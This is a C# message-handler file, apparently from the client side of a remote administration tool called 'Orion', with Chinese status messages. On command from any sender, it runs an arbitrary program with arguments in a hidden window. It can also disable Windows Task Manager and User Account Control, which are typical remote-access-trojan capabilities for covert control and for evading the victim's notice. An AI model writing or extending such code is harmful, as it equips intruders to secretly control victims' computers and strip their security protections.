using Orion.Common.Messages;
using Orion.Common.Networking;
using Orion.Common.Messages.Other;
using Orion.Common.Messages.QuickCommands;
using System.Diagnostics;
using Orion.Client.Helper.TaskManager;
using Orion.Client.Helper.UAC;

namespace Orion.Client.Messages
{

    public class QuickCommandHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoSendQuickCommand || message is DoEnableTaskManager || message is DoDisableTaskManager || message is DoDisableUAC || message is DoEnableUAC;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoSendQuickCommand msg:
                    Execute(sender, msg);
                    break;

                case DoEnableTaskManager msg:
                    Execute(sender, msg);
                    break;

                case DoDisableTaskManager msg:
                    Execute(sender, msg);
                    break;

                case DoDisableUAC msg:
                    Execute(sender, msg);
                    break;

                case DoEnableUAC msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoSendQuickCommand message)
        {
            client.Send(new SetStatus { Message = "快捷命令执行成功" });

            Debug.WriteLine(message.Host + " " + message.Command);

            //execute a new powershell with the command
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = message.Host;
            startInfo.Arguments = message.Command;
            process.StartInfo = startInfo;
            process.Start();
        }

        private void Execute(ISender client, DoEnableTaskManager message)
        {
            client.Send(new SetStatus { Message = "任务管理器已启用" });
            TaskManager.Enable();
        }

        private void Execute(ISender client, DoDisableTaskManager message)
        {
            client.Send(new SetStatus { Message = "任务管理器已禁用" });
            TaskManager.Disable();
        }

        private void Execute(ISender client, DoDisableUAC message)
        {
            client.Send(new SetStatus { Message = "UAC 已禁用，需要重启生效" });
            UACToggle.DisableUAC();
        }

        private void Execute(ISender client, DoEnableUAC message)
        {
            client.Send(new SetStatus { Message = "UAC 已启用，需要重启生效" });
            UACToggle.EnableUAC();
        }
    }
}
